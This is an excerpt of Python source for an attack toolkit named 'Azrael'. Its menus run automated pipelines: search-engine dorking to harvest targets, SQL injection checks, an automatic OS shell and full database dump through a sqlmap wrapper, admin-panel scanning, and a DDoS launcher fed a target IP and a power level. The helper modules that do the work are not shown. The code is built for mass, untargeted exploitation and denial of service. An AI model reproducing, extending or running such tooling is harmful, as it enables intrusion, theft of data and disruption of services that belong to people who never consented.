...
⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠛⠉
  ...
  {d}web security and intelligence toolkit{w}    
  {d}Authors: {w}{r}@xNovem{d}
"""
...
def menu():
    ...
    print(f"""
        ...
        {w}{b}  01{w} WebHacking    {d} WebHacking Tools
        {w}{b}  02{w} Osint         {d} Osint Tools
    ...
    while True: 
        try:
            ...
            if int(len(cmd)) < 6:
                ...
                elif cmd in ("1","01"): webmenu()
                elif cmd in ("2","02"): osintmenu()
            else: continue
    ...
    while True: 
        try:
            ...
            if int(len(cmd)) < 6:
                ...
                elif cmd in ("6","06"): iplocation()                
                elif cmd in ("7","07"): bypass_bitly()
                elif cmd in ("8","08"): github_lookup()
                elif cmd in ("9","09"): temp_mail_gen()
                elif cmd in ("99"): menu()
            else: continue
        except KeyboardInterrupt:
            exit(f"{r}\n{space}* Aborted !")
...
def osintmenu():
    ...
    print(f"""
        ...
        {w}{b}  06{w} IPlocation    {d} IP to location tracker
        {w}{b}  07{w} Bitly Bypass  {d} Bypass all bitly urls
        {w}{b}  08{w} Github Lookup {d} Dump GitHub information
        {w}{b}  09{w} TempMail {d}      Generate Temp Mail and Mail Box
        {w}{b}  99{w} Back {d}  
        {w}{b}  00{w} Exit          {d} bye bye ):
        """)
    osintcmd()
...
def webmenu():
    ...
    print(f"""
        ...
        {w}{b}  01{w} Sql           {d} SQL injection Tools
        {w}{b}  02{w} Nmap Scan     {d} Nmap Scanning
        {w}{b}  03{w} DNSLookup     {d} Domain name system lookup
        {w}{b}  04{w} Whoislookup   {d} Identify who is on domain
        {w}{b}  05{w} Sublookup     {d} Subnetwork lookup
        {w}{b}  06{w} Hostfinder    {d} Find host domain
        {w}{b}  07{w} DNSfinder     {d} Find host domain name system
        {w}{b}  08{w} RIPlookup     {d} Reverse IP lookup
        {w}{b}  09{w} DDos          {d} DDos Attack
        {w}{b}  99{w} Back          {d} Go Back
        {w}{b}  00{w} Exit          {d} bye bye ):
        """)
    webcmd()
...
def webcmd():
    while True: 
        try:
            ...
            if int(len(cmd)) < 6:
                if cmd in ("exit","Exit", "00", "0"): exit(r+space+"* Exiting !"+w)
                elif cmd in ("1","01"): sqlmenu()
                elif cmd in ("2","02"): nmap_scan()
                elif cmd in ("3","03"): infoga("dnslookup")
                elif cmd in ("4","04"): infoga("whois")
                elif cmd in ("5","05"): infoga("subnetcalc")
                elif cmd in ("6","06"): infoga("hostsearch")
                elif cmd in ("7","07"): infoga("mtr")
                elif cmd in ("8","08"): infoga("reverseiplookup")
                elif cmd in ("9","09"): ddostool()
                elif cmd in ("99"): menu()
            else: continue
        except KeyboardInterrupt:
            exit(f"{r}\n{space}* Aborted !")
...
def sqlmenu():
    ...
    print(f"""
        ...
        {w}{b}  01{w} Dork Scan              {d} Scanner,Dump and more
        {w}{b}  02{w} SQL İnjection Control  {d} (results/resuls.txt)
        {w}{b}  03{w} Automatic Shell        {d} (results/sql.txt)
        {w}{b}  04{w} Automatic Dump         {d} (results/sql.txt)
        {w}{b}  05{w} Panel Scanning         {d} (results/sql.txt)
        {w}{b}  06{w} Fast Panel Scanning    {d} (results/sql.txt)
        {w}{b}  07{w} Dork Scan > SQL İnjection Control > Panel Scanning       
        {w}{b}  08{w} Dork Scan > SQL İnjection Control > Fast Panel Scanning          
        {w}{b}  09{w} Dork Scan > SQL İnjection Control > Automatic Dump          
        {w}{b}  10{w} Dork Scan > SQL İnjection Control > Fast Panel Scanning > Automatic Dump                      
        """) 
    sqlcmd()
...
def sqlcmd():
    while True: 
        try:
            ...
            if int(len(cmd)) < 6:
                if cmd in ("exit","Exit", "00", "0"): exit(r+space+"* Exiting !"+w)
                elif cmd in ("1","01"): dork_tara()
                elif cmd in ("2","02"): sql_injection_kontrol()
                elif cmd in ("3","03"): oto_shell()
                elif cmd in ("4","04"): oto_dump()
                elif cmd in ("5","05"): panel_tara()
                elif cmd in ("6","06"): hizli_panel_tara()
                elif cmd in ("7","07"): dork_sql_panel_dump()
                elif cmd in ("8","08"): dork_sql_hizli_panel_oto_dump()
                elif cmd in ("9","09"): dork_sql_oto_shell()
                elif cmd in ("10","10"): dork_sql_hizli_panel_oto_dump()
            else: continue
        except KeyboardInterrupt:
            exit(f"{r}\n{space}* Aborted !")
...
def ddostool():
    ...
    sayi = input("Enter power (Max=200): ")
    subprocess.run(["python", dosya_adi, "-s", ip_adresi, "-t", sayi], text=True, check=True)
    ddostool()

def dork_tara():
    colorprint.colorprint("Dork scanning initiated!")
    dorkwithselenium.aramamotoru()
    colorprint.colorprint("Dork scan complete!")

def sql_injection_kontrol():
    UrlList = open("results/results.txt", "r").read().splitlines()
    colorprint.colorprint("SQL Injection control Initiated!")
    SQLVulnDetector.VulnMain(UrlList, 50)
    colorprint.colorprint("SQL Injection check complete!")

def oto_shell():
    colorprint.colorprint("automatic shell starts!")
    sqlmapper.os_shell()
    colorprint.colorprint("automatic shell complete!")

def oto_dump():
    colorprint.colorprint("automatic dumo starts!")
    sqlmapper.dumpall()
    colorprint.colorprint("automatic dumo complate!")

def panel_tara():
    colorprint.colorprint("Panel Screening launched!")
    PanelFind.main(0)
    colorprint.colorprint("Panel Screening completed")

def hizli_panel_tara():
    colorprint.colorprint("Fast Panel Screening launched!")
    PanelFind.main(1)
    colorprint.colorprint("Fast Panel Screening completed!")

def dork_sql_panel_dump():
    dork_tara()
    UrlList = open("results/results.txt", "r").read().splitlines()
    sql_injection_kontrol()
    panel_tara()
    oto_dump()

def dork_sql_hizli_panel_oto_dump():
    dork_tara()
    UrlList = open("results/results.txt", "r").read().splitlines()
    sql_injection_kontrol()
    hizli_panel_tara()
...
def nmap_scan():
  ...
  print(f"""
        ...
        {w}Please enter the IP address you want to scan:{w}""")
  
  ip_address = input()
  nmapcmd(ip_address)

def nmapcmd(ip_address):
  command = f"nmap -sV {ip_address}"
...
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇                ┏───────────────────────────────┓
⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇                │       WELCOME TO AZRAEL       │
⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀                │   {lr}https://github.com/xNovem{r}   │
⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀                │   {lr}https://xnovem.github.io{r}    │
⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀                └───────────────────────────────┘
⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀              
⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
